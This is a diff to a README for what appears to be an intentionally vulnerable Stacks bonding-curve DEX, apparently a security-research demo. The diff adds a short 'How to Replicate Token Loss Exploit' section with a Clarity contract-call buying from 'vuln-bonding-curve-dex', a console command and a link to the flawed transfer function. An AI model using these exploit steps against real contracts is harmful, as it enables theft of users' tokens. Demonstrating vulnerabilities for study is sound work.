@@ -34,3 +34,15 @@ When the market cap reaches 10,000 STX, all the liquidity ($STX and XYZ) from th
 Step 5: Trading Pair and Liquidity
 After that, the Velar team will create a trading pair and add liquidity for XYZ.
 Estimated market cap by then: $16,691.316
+
+## How to Replicate Token Loss Exploit
+
+```
+(contract-call? 'ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.vuln-bonding-curve-dex buy 'ST1PQHQKV0RJXZFY1DGX8MNSNYVE3VGZJSRTPGZGM.vuln-token u100000000)
+```
+
+```
+::get_assets_maps
+```
+
+[transfer](https://github.com/Gecko-Security/bonding-curve-v1/blob/main/contracts/vuln-token.clar#L136)
